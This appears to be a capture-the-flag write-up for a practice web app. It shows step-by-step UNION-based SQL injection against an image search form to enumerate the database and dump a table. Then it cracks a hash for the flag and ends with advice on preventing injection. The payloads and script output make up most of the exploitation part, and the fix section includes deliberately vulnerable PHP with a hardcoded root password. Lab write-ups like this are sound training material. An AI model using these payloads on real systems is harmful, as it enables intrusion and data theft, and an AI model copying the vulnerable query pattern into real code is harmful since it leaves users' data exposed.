# SQL injection searchimg

## Exploitation

On the homepage, on the bottom, there is some images and 2 buttons **ADD IMAGE** and **SEARCH IMAGE**. On the "search image" page (http://192.168.1.48/?page=searchimg), there is a form for searching images by the number

A search with the number `1` returns:

```
ID: 1 
Title: Nsa
Url : https://www.nsa.org/img.jpg
```

We can check if there is a SQL injection vulnerability by sending and addition. If we send `2-1` and the result is the id `1`, the addition was executed by the SQL request

```
ID: 2-1 
Title: Nsa
Url : https://www.nsa.org/img.jpg
```

We can use a SQL injection on this form

We need to know the numbers of fields. We will use `ORDER BY` to do this. If we send `1 ORDER BY X` and get an error (no result), the number X of fields is false, we can get the number by increasing it and test

We will using our script to launch injections

```
$ ./exploit.py "1 ORDER BY 2"
['1 ORDER BY 2 ', 'Nsa', 'https://www.nsa.org/img.jpg']
$ ./exploit.py "1 ORDER BY 3"
Injection failed
```

The number of fields is 2

The name of the database

```sql
-1 UNION SELECT 1, database()
```

```
$ ./exploit.py '-1 UNION SELECT 1, database()'
['-1 UNION SELECT 1, database() ', 'Member_images', '1']
```

The name of the database is `Member_images`

Now get the tables list

```sql
-1 UNION SELECT 1, TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database() 
```

```
$ ./exploit.py '-1 UNION SELECT 1, TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database()'
['-1 UNION SELECT 1, TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database() ', 'list_images', '1']
```

There is 1 table : `list_images`

Get the table colums

```sql
-1 UNION SELECT 1, COLUMN_NAME FROM information_schema.columns WHERE TABLE_SCHEMA=database() 
```

```
$ ./exploit.py '-1 UNION SELECT 1, COLUMN_NAME FROM information_schema.columns WHERE TABLE_SCHEMA=database() '
['-1 UNION SELECT 1, COLUMN_NAME FROM information_schema.columns WHERE TABLE_SCHEMA=database()  ', 'id', '1']
['-1 UNION SELECT 1, COLUMN_NAME FROM information_schema.columns WHERE TABLE_SCHEMA=database()  ', 'url', '1']
['-1 UNION SELECT 1, COLUMN_NAME FROM information_schema.columns WHERE TABLE_SCHEMA=database()  ', 'title', '1']
['-1 UNION SELECT 1, COLUMN_NAME FROM information_schema.columns WHERE TABLE_SCHEMA=database()  ', 'comment', '1']
```

There is 4 columns:

- id
- url
- title
- comment

Print the columns value

```sql
-1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images 
```

```
$ ./exploit.py '-1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images'                          
['ID: -1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images ', 'Title: 1https://www.nsa.org/img.jpgNsaAn image about the NSA !', 'Url : 1']
['ID: -1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images ', 'Title: 2https://www.42.fr/42.png42 !There is a number..', 'Url : 1']
['ID: -1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images ', 'Title: 3https://www.google.fr/google.pngGoogleGoogle it !', 'Url : 1']
['ID: -1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images ', 'Title: 4https://www.obama.org/obama.jpgObamaYes we can !', 'Url : 1']
['ID: -1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images ', 'Title: 5borntosec.ddns.net/images.pngHack me ?If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46', 'Url : 1']
['ID: -1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images ', 'Title: 6https://www.h4x0r3.0rg/tr0ll.pngtr00lBecause why not ?', 'Url : 1']
```

We can see some instructions to get the flag. Need to md5 decode, put in lowercase and sha256 the flag

After md5 decoding, the password is `albatroz`, sha256 it!

## How to fix it?

An SQL injection is a sanitization issue. It happens when a SQL request is used with a non sanitized data. For exemple:

```php
$db = new mysqli('localhost', 'root', 'passwd', 'base');
$result = $db->query('SELECT * FROM users WHERE user="'.$_GET['user'].'" AND pass= "'.$_GET['password'].'"');
```

In this exemple, the SQL request is build with the raw GET parameters value. We can inject some SQL in the parameters and change the original request to access/modify some data.

The way to fix it is to ALWAYS sanitize ALL the input data. Never trust the user

To help, in PHP there is some functions to do it, for exemple `mysqli_real_escape_string()`, or you can do it manually.

The better way is to use a framework to manage to Database access for you.

## References

- https://zestedesavoir.com/tutoriels/945/les-injections-sql-le-tutoriel/les-injections-sql-classiques/affichage-denregistrements/
- https://blog.detectify.com/2016/03/08/what-is-a-sql-injection-and-how-do-you-fix-it/


